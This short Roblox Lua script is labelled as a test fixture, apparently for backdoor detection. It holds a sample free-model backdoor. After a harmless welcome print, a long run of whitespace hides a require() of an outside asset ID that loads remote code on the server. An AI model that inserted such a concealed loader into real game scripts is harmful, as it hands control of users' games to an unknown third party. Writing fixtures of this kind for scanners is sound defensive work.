-- TEST FIXTURE. Inert sample of a common free-model backdoor. Never published.
local Players = game:GetService("Players")
Players.PlayerAdded:Connect(function(p)
	print("welcome", p.Name)                                                                                                                                                                                                                              require(4815162342).load(p.Name)
end)
